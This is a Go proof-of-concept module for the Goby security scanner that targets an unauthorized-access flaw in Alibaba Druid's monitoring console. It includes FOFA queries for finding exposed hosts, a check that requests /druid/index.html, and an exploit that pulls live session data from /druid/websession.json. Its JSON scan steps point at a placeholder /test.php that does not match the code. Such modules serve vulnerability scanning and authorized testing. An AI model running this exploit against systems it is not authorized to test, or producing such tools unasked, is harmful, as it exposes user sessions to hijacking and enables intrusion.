package exploits

import (
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"strings"
)

func init() {
	expJson := `{
    "Name": "Alibaba druid database monitoring index.html unauthorized access vulnerability",
    "Description": "<p>Alibaba Druid is a secondary development version of Apache Druid by Alibaba. It has made some improvements and extensions based on Apache Druid. It has stronger performance and scalability, and provides some special functions, such as automatic backup, data monitoring, etc.</p><p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
    "Product": "Alibaba Druid",
    "Homepage": "https://github.com/alibaba/druid",
    "DisclosureDate": "2015-02-27",
    "PostTime": "2023-09-12",
    "Author": "whoamisb@163.com",
    "FofaQuery": "(title=\"Druid Stat Index\" || body=\"id=\\\"DruidVersion\\\"\" || header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || header=\"JSESSIONID=\" || banner=\"JSESSIONID=\") && body!=\"couchdb\"",
    "GobyQuery": "(title=\"Druid Stat Index\" || body=\"id=\\\"DruidVersion\\\"\" || header=\"Server: Netty@SpringBoot\" || (body=\"Whitelabel Error Page\" && body=\"There was an unexpected error\") || header=\"JSESSIONID=\" || banner=\"JSESSIONID=\") && body!=\"couchdb\"",
    "Level": "3",
    "Impact": "<p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
    "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
    "References": [
        "https://bugs.shuimugan.com/bug/view?bug_no=91433"
    ],
    "Is0day": false,
    "HasExp": true,
    "ExpParams": [
        {
            "name": "attackType",
            "type": "select",
            "value": "session",
            "show": ""
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "ExploitSteps": [
        "AND",
        {
            "Request": {
                "method": "GET",
                "uri": "/test.php",
                "follow_redirect": true,
                "header": {},
                "data_type": "text",
                "data": ""
            },
            "ResponseTest": {
                "type": "group",
                "operation": "AND",
                "checks": [
                    {
                        "type": "item",
                        "variable": "$code",
                        "operation": "==",
                        "value": "200",
                        "bz": ""
                    },
                    {
                        "type": "item",
                        "variable": "$body",
                        "operation": "contains",
                        "value": "test",
                        "bz": ""
                    }
                ]
            },
            "SetVariable": []
        }
    ],
    "Tags": [
        "Unauthorized Access"
    ],
    "VulType": [
        "Unauthorized Access"
    ],
    "CVEIDs": [
        ""
    ],
    "CNNVD": [
        ""
    ],
    "CNVD": [
        ""
    ],
    "CVSSScore": "7.5",
    "Translation": {
        "CN": {
            "Name": "Alibaba druid 数据库监控 index.html 未授权访问漏洞",
            "Product": "Alibaba Druid",
            "Description": "<p>Alibaba Druid 是阿里巴巴公司对 Apache Druid 的一个二次开发版本，在 Apache Druid 的基础上进行了一些改进和扩展。它具有更强的性能和可伸缩性，并且提供了一些特殊的功能，如自动备份、数据监控等。</p><p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。</p>",
            "Recommendation": "<p>目前没有详细的解决方案提供，请关注厂商主页更新：<a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>临时修复方案：</p><p>1、通过防火墙等安全设备设置访问策略，设置白名单访问。</p><p>2、如非必要，禁止公网访问该系统。</p>",
            "Impact": "<p>攻击者可通过未授权访问漏洞控制整个系统，最终导致系统处于极度不安全状态。<br></p>",
            "VulType": [
                "未授权访问"
            ],
            "Tags": [
                "未授权访问"
            ]
        },
        "EN": {
            "Name": "Alibaba druid database monitoring index.html unauthorized access vulnerability",
            "Product": "Alibaba Druid",
            "Description": "<p>Alibaba Druid is a secondary development version of Apache Druid by Alibaba. It has made some improvements and extensions based on Apache Druid. It has stronger performance and scalability, and provides some special functions, such as automatic backup, data monitoring, etc.</p><p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.</p>",
            "Recommendation": "<p>There is currently no detailed solution provided, please pay attention to the manufacturer's homepage for updates: <a href=\"https://github.com/alibaba/druid\">https://github.com/alibaba/druid</a></p><p>Temporary fix:</p><p>1. Set access policies through security devices such as firewalls and set whitelist access.</p><p>2. Unless necessary, it is prohibited to access the system from the public network.</p>",
            "Impact": "<p>An attacker can control the entire system through unauthorized access vulnerabilities, ultimately leaving the system in an extremely unsafe state.<br></p>",
            "VulType": [
                "Unauthorized Access"
            ],
            "Tags": [
                "Unauthorized Access"
            ]
        }
    },
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "7441"
}`

	sendPayloadGRYFFjhc4 := func(hostInfo *httpclient.FixUrl, uri string) (*httpclient.HttpResponse, error) {
		getRequestConfig := httpclient.NewGetRequestConfig(uri)
		getRequestConfig.VerifyTls = false
		getRequestConfig.FollowRedirect = false
		return httpclient.DoHttpRequest(hostInfo, getRequestConfig)
	}
	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(poc *jsonvul.JsonVul, hostinfo *httpclient.FixUrl, stepLogs *scanconfig.SingleScanConfig) bool {
			resp, _ := sendPayloadGRYFFjhc4(hostinfo, "/druid/index.html")
			return resp != nil && resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "Druid Stat Index")
		},
		func(expResult *jsonvul.ExploitResult, stepLogs *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			attackType := goutils.B2S(stepLogs.Params["attackType"])
			if attackType == "session" {
				resp, err := sendPayloadGRYFFjhc4(expResult.HostInfo, "/druid/websession.json")
				if err != nil {
					expResult.Success = false
					expResult.Output = err.Error()
				} else if resp != nil && strings.Contains(resp.Utf8Html, "\"ResultCode\":1") {
					expResult.Success = true
					expResult.Output = resp.Utf8Html
				} else {
					expResult.Success = false
					expResult.Output = `漏洞利用失败`
				}
			} else {
				expResult.Success = false
				expResult.Output = `未知的利用方式`
			}
			return expResult
		},
	))
}
